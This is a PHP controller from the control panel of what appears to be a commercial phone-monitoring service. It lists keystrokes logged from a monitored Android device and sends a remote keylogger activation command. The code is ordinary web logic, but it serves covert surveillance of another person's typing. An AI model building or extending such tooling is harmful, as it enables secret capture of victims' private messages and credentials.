<?php

namespace Controllers;

use Models\Modules,
    CS\Devices\Limitations,
    System\FlashMessages;

class Keylogger extends BaseModuleController
{

    protected $module = Modules::KEYLOGGER;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {   
        if ($this->view->paid && $this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] >= 11) {
            return $this->withActivation();
        }

        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            $data = $keyloggerModel->getDataTableData(
                    $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
            );
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }

        if ($this->view->paid) {
            $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
        }

        $this->setView('cp/keylogger/index.htm');
    }

    private function withActivation()
    {
        $settingsModel = new \Models\Cp\Settings($this->di);
        $settings = $settingsModel->getDeviceSettings($this->di['devId']);

        if ($settings['keylogger_enabled']) {
            $keyloggerModel = new \Models\Cp\Keylogger($this->di);
            if ($this->getRequest()->isAjax()) {
                $dataTableRequest = new \System\DataTableRequest($this->di);

                $data = $keyloggerModel->getDataTableData(
                        $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                );
                $this->checkDisplayLength($dataTableRequest->getDisplayLength());
                $this->makeJSONResponse($data);
            }

            if ($this->view->paid) {
                $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
            }

            $this->setView('cp/keylogger/index.htm');
        } else {
            if ($this->getRequest()->hasGet('activate')) {
                $settingsModel->activateKeylogger($this->di['devId']);
                $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Keylogger activation command has been successfully sent! Command activation will take up to 20 min.'));
                $this->redirect($this->di['router']->getRouteUrl('keylogger'));
            }
            
            $this->setView('cp/keylogger/activation.htm');
        }
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Keylogger');
    }

    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::KEYLOGGER);
    }

}
